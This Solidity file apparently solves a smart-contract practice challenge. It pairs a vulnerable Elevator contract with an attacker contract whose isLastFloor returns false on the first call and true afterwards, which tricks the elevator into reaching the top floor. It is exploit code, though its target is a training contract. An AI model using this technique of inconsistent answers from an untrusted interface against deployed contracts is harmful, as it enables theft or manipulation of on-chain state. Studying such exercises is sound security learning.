// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Build is Building{

    Elevator public elevator;
    uint public counter;

    constructor(Elevator _elevator){
        elevator = _elevator;
    }

    function isLastFloor(uint) external returns (bool){
        if(counter == 0 ){
            counter++;
            return false;
        }else{
            counter++;
            return true; 
        }
    }

    function go(uint floor) public{
        elevator.goTo(floor);
    }


}